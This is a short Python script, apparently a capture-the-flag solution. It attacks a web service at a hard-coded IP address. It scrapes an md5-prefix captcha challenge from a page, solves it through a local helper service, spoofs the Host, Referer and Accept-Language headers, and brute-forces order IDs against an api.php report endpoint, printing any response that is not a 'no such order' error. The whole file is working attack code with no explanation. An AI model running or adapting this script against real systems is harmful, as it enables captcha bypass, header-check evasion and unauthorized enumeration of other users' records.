import requests
import re


def captcha(s: str):
    ret = requests.get('http://localhost:8080', params={'t': s})
    return ret.text


url = 'http://123.59.141.153/5a560e50e61b552d34480017c7877467info.php'
post_url = 'http://123.59.141.153/api.php?action=report'

headers = {
    'Host': 'www.tmvb.com',
    'Referer': 'www.DWW.com',
    'Accept-Language': 'ja'
}

session = requests.Session()

for i in range(9999, 9000, -1):
    try:
        r = session.get(url, headers=headers)
        cap = re.search("substr\(md5\(code\),0,6\) === '(.*?)'", r.text).group(1)
        print(f'id: {i} cap: {cap}')
        cap = captcha(cap)
        r = session.post(post_url, headers=headers, data={
            'TxtTid': i,
            'code': cap
        })
        if r.text != '{"error":0,"msg":"There\'s no such order."}':
            print(r.text)
    except Exception:
        print(f'{i} error')
